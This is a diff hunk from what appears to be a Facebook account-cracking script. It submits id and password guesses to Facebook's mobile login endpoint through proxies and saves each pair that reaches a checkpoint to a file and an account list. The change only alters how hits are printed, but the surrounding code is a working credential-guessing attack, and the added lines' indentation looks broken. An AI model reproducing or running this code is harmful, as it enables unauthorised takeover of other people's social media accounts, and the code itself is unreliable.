@@ -1800,22 +1800,16 @@ def reguler2(idf,pwv):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'no' in gabriel:
-					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-					akun.append(idf+'|'+pw)
+					print(f'\r{K}>> {idf}|{pw}{N}')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')			
+				akun.append(idf+'|'+pw)
+				cp+=1
 					break
 				elif 'ya' in gabriel:
-					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-					akun.append(idf+'|'+pw)
+					print(f'\r{K}>> {idf}|{pw}{N}')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')			
+				akun.append(idf+'|'+pw)
+				cp+=1
 					ceker(idf,pw)
 					break
 			elif "c_user" in ses.cookies.get_dict().keys():
